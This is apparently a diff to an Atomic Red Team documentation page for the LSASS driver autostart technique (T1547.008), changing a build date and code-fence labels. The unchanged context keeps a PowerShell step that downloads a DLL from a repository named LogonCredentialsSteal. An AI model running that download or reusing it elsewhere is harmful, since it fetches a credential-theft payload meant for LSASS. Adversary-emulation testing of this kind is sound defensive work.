@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1547.008"
 attack_technique_name: "Boot or Logon Autostart Execution: LSASS Driver"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.008/T1547.008.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "powershell"
 aliases:
   - "8ecef16d-d289-46b4-917b-0dba6dc81cf1"
@@ -56,13 +56,13 @@ lsass_lib.dll must exist on disk at specified location (#{dll_path})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{dll_path}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest "https://github.com/oxfemale/LogonCredentialsSteal/raw/53e74251f397ddeab2bd1348c3ff26d702cfd836/lsass_lib/x64/Release/lsass_lib.dll" -UseBasicParsing -OutFile "#{dll_path}"
